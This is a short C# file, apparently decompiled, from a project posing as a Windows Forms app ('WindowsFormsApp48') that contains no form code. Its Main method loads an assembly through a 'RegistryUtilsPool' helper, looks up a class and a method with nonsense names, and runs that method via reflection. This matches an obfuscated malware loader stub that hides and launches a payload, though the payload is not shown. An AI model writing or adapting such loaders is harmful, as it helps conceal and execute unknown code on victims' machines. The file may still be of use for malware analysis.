using System;
using System.Reflection;

namespace WindowsFormsApp48;

internal class Global
{
	internal static Global RemoveResolver;

	private static void Main()
	{
		new RegistryUtilsPool();
		CloneGlobal()();
	}

	private static Action CloneGlobal()
	{
		return (Action)CloneResolver(typeof(Action), ExcludeGlobal() as MethodInfo);
	}

	private static object ExcludeGlobal()
	{
		return new RegistryUtilsPool().LogoutGlobal().GetType("Ktbihuri.Tnrobna")!.GetMethod("Dxwqdkfbtujrorzkfkc");
	}

	internal static object CloneResolver(Type type_0, object object_0)
	{
		return Delegate.CreateDelegate(type_0, (MethodInfo)object_0);
	}

	internal static bool AssetResolver()
	{
		return RemoveResolver == null;
	}

	internal static Global MapResolver()
	{
		return RemoveResolver;
	}
}
